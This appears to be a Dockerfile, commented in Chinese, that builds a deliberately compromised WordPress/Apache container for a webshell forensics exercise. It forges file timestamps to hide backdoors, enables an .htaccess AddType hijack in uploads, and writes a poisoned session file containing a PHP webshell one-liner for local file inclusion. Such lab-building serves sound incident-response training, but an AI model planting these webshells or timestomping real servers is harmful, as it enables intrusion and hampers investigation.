FROM php:8.1-apache

# .htaccess 默认是 AllowOverride None，这里放开，让上传目录里的
# AddType 劫持能够生效（真实被入侵站点常见于开过 AllowOverride 的主机）。
RUN sed -i 's|AllowOverride None|AllowOverride All|' /etc/apache2/apache2.conf

# 官方镜像把 access.log / error.log 软链到了 stdout。改成真实文件，
# 这样才可以在容器里 grep 历史请求——排查 webshell 时日志是第一证据源。
RUN rm -f /var/log/apache2/access.log /var/log/apache2/error.log \
 && touch /var/log/apache2/access.log /var/log/apache2/error.log \
 && chown www-data:adm /var/log/apache2/access.log /var/log/apache2/error.log \
 && chmod 640 /var/log/apache2/access.log /var/log/apache2/error.log

COPY php/ /var/www/html/

# ---------------------------------------------------------------------------
# 基线：正常文件统一 root:root 755/644
# ---------------------------------------------------------------------------
RUN set -e; \
    chown -R root:root /var/www/html; \
    find /var/www/html -type d -exec chmod 755 {} +; \
    find /var/www/html -type f -exec chmod 644 {} +

# ---------------------------------------------------------------------------
# 基线时间：站点 2025-11-10 上线，2026-03 做过一次内容更新。
# 注意 functions.php 虽然有后门，但攻击者把 mtime 改回了安装时间，
# 所以纯时间线排查是抓不到它的。
# ---------------------------------------------------------------------------
RUN set -e; cd /var/www/html; \
    touch -d '2025-11-10 09:20:00' wp-config.php index.php wp-login.php \
        wp-content/index.php wp-content/mu-plugins/index.php; \
    touch -d '2025-11-10 09:21:00' wp-includes/functions.php wp-includes/class-wp-query.php \
        wp-includes/simple.php; \
    touch -d '2025-11-10 09:22:00' wp-admin/index.php wp-admin/admin-ajax.php; \
    touch -d '2025-11-12 09:31:00' wp-content/themes/twentytwenty/style.css \
        wp-content/themes/twentytwenty/index.php \
        wp-content/themes/twentytwenty/functions.php; \
    touch -d '2025-11-13 10:02:00' wp-blog-header.php; \
    touch -d '2026-01-20 14:08:00' wp-content/plugins/akismet/akismet.php; \
    touch -d '2026-02-08 11:45:00' assets/js/app.js; \
    touch -d '2026-03-15 16:22:00' wp-content/uploads/2026/03/banner.jpg

# ---------------------------------------------------------------------------
# 上传目录：属主是 www-data（Web 进程可写），这就是攻击者能落地的原因
# ---------------------------------------------------------------------------
RUN set -e; \
    chown -R www-data:www-data /var/www/html/wp-content/uploads; \
    find /var/www/html/wp-content/uploads -type d -exec chmod 755 {} +; \
    find /var/www/html/wp-content/uploads -type f -exec chmod 644 {} +

# ---------------------------------------------------------------------------
# 入侵痕迹：2026-10-20 03:39 ~ 03:44（容器时区 UTC，与 access.log 的 +0000 对齐）
# 属主统一留成 www-data —— 说明是 Web 进程写进来的，不是运维用 root 上传的
# ---------------------------------------------------------------------------
RUN set -e; cd /var/www/html; \
    chown www-data:www-data wp-includes/simple.php upgrade.php \
        wp-content/mu-plugins/loader.php \
        wp-content/uploads/2026/03/.htaccess \
        wp-content/uploads/2026/03/logo.jpg \
        wp-content/uploads/2026/03/index.php.bak; \
    touch -d '2026-10-20 03:39:12' wp-includes/simple.php; \
    touch -d '2026-10-20 03:40:07' upgrade.php; \
    touch -d '2026-10-20 03:40:52' wp-content/uploads/2026/03/.htaccess; \
    touch -d '2026-10-20 03:41:20' wp-content/uploads/2026/03/logo.jpg; \
    touch -d '2026-10-20 03:43:18' wp-content/uploads/2026/03/index.php.bak; \
    touch -d '2026-10-20 03:44:35' wp-content/mu-plugins/loader.php

# ---------------------------------------------------------------------------
# 时间戳伪装样本：mtime 改到 2024 年，权限 600，全站唯一一个非 644 的 php
# ---------------------------------------------------------------------------
RUN set -e; \
    chown www-data:www-data /var/www/html/wp-content/plugins/cache/.wp-check.php; \
    chmod 600 /var/www/html/wp-content/plugins/cache/.wp-check.php; \
    touch -d '2024-06-12 08:15:00' /var/www/html/wp-content/plugins/cache/.wp-check.php

# ---------------------------------------------------------------------------
# Session 投毒残留：正常 session 在 /var/lib/php/sessions，
# 这个却被写在 /var/tmp —— 属于典型的"先落一个文件，等 LFI 来包含"
# ---------------------------------------------------------------------------
RUN set -e; \
    mkdir -p /var/lib/php/sessions && chown www-data:www-data /var/lib/php/sessions; \
    printf 'uid|i:1;uname|s:5:"admin";role|s:13:"administrator";payload|s:28:"<?php @system($_GET['"'"'c'"'"']); ?>";' \
        > /var/tmp/sess_a3f9c2e1b7d4; \
    chown www-data:www-data /var/tmp/sess_a3f9c2e1b7d4; \
    touch -d '2026-10-20 03:46:02' /var/tmp/sess_a3f9c2e1b7d4; \
    printf 'uid|i:1;uname|s:4:"demo";role|s:10:"subscriber";' \
        > /var/lib/php/sessions/sess_demo0000000000000000000000; \
    chown www-data:www-data /var/lib/php/sessions/sess_demo0000000000000000000000; \
    touch -d '2026-03-15 16:20:00' /var/lib/php/sessions/sess_demo0000000000000000000000

# ---------------------------------------------------------------------------
# 历史访问日志：混入正常访客 + 攻击者探测 + 后门交互，制造真实噪音
# ---------------------------------------------------------------------------
COPY access.log /var/log/apache2/access.log
RUN chown www-data:adm /var/log/apache2/access.log && chmod 640 /var/log/apache2/access.log

EXPOSE 80
